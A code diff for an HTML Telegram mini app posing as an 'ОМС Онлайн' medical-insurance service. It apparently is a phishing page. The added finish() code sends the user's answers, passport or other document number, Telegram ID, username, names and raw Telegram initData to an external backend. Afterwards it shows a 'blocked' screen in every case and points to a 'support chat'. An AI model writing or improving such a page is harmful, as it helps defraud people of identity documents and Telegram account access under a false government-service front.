@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <title>ОМС Онлайн</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
@@ -39,7 +39,6 @@
 <body class="flex items-center justify-center">
 
   <div class="container bg-white rounded-2xl shadow-2xl p-8">
-
     <!-- Приветствие -->
     <div id="welcome" class="text-center fade">
       <h1 class="text-3xl font-bold text-blue-800 mb-6">👋 Здравствуйте!</h1>
@@ -136,12 +135,42 @@
         Перейти в чат поддержки
       </a>
     </div>
-
   </div>
 
   <script>
     let answers = {};
     let currentStep = 0;
+
+    // ────────────────────────────────────────────────
+    //  Инициализация Telegram Web App
+    // ────────────────────────────────────────────────
+    document.addEventListener('DOMContentLoaded', () => {
+      if (window.Telegram?.WebApp) {
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();           // ← растягиваем на весь экран
+        // tg.MainButton.show(); // можно включить, если захочешь нижнюю кнопку
+      }
+    });
+
+    function getTelegramUser() {
+      const tg = window.Telegram?.WebApp;
+      if (!tg?.initDataUnsafe?.user) {
+        return {
+          userId: 'not_in_telegram',
+          username: 'not_in_telegram',
+          firstName: '',
+          lastName: ''
+        };
+      }
+      const user = tg.initDataUnsafe.user;
+      return {
+        userId: String(user.id || 'no-id'),
+        username: user.username || 'no-username',
+        firstName: user.first_name || '',
+        lastName: user.last_name || ''
+      };
+    }
 
     function show(id) {
       document.querySelectorAll('#welcome, [id^="step"], #check, #blocked').forEach(el => el.classList.add('hidden'));
@@ -184,53 +213,55 @@
       const type = answers.docType;
       const error = document.getElementById('docError');
       const expectedLength = type === 'Паспорт' ? 10 : 11;
+
       if (!val || val.length !== expectedLength) {
         error.textContent = `Неверный формат: нужно ровно ${expectedLength} цифр`;
         error.classList.remove('hidden');
         return;
       }
+
       save('docNumber', val);
       error.classList.add('hidden');
       show('step6');
     }
 
-    function finish() {
+    async function finish() {
+      const userData = getTelegramUser();
+
       const payload = {
         ...answers,
-        userId: Telegram.WebApp.initDataUnsafe?.user?.id || 'test-user',
-        username: Telegram.WebApp.initDataUnsafe?.user?.username || 'test-username'
+        ...userData,
+        timestamp: new Date().toISOString(),
+        initData: window.Telegram?.WebApp?.initData || ''  // полезно для отладки / верификации
       };
 
       console.log("Отправляем данные:", payload);
 
       const backendUrl = 'https://oms-mini-app-backend-production.up.railway.app/submit';
 
-      fetch(backendUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      })
-      .then(response => {
-        console.log('Ответ от сервера:', response.status, response.statusText);
-        return response.json();
-      })
-      .then(result => {
+      try {
+        const response = await fetch(backendUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status}`);
+        }
+
+        const result = await response.json();
         console.log('Успешный ответ:', result);
+      } catch (err) {
+        console.error('Ошибка отправки:', err);
+      } finally {
+        // Показываем экран "заблокирован" в любом случае
         show('blocked');
-      })
-      .catch(err => {
-        console.error('Ошибка fetch:', err);
-        show('blocked');  // показываем блокировку даже при ошибке
-      });
+      }
     }
 
-    // Имитация Telegram.WebApp для теста в браузере
-    window.Telegram = {
-      WebApp: {
-        initDataUnsafe: { user: { id: '123456', username: 'testuser' } },
-        sendData: (data) => console.log('Отправлено:', data)
-      }
-    };
+    // Для локального тестирования в браузере (можно закомментировать в продакшене)
+    // window.Telegram = { WebApp: { initDataUnsafe: { user: { id: 777, username: 'test_dev' } } } };
   </script>
 </body>
 </html>
